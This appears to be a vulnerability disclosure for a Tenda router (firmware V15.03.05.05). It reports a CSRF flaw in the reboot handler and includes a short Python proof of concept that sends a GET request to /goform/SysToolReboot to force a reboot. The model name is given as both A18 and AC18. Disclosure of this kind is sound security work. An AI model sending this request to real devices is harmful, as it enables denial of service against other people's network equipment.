## Overview

- The device's official website: https://www.tenda.com.cn/product/overview/AC18.html
- Firmware download website: https://www.tenda.com.cn/download/detail-2610.html

## Affected version

V15.03.05.05

## Vulnerability details

The Tenda A18 V15.03.05.05 has a Cross Site Request Forgery (CSRF) vulnerability located in the `fromSysToolReboot` function. It allows remote attackers to reboot the device and cause denial of service.

![image-20240308165955719](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240308165955719.png)

![image-20240308170203962](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240308170203962.png)

## PoC

```python
import requests

url = "http://192.168.84.101/goform/SysToolReboot"

headers = {
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'zh-CN,zh;q=0.9',
    'Cookie': 'bLanguage=cn; user=; password=yrhsd',
    'Connection': 'close'
}

response = requests.get(url, headers=headers)

print(response.text)
```

![image-20240308165744095](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240308165744095.png)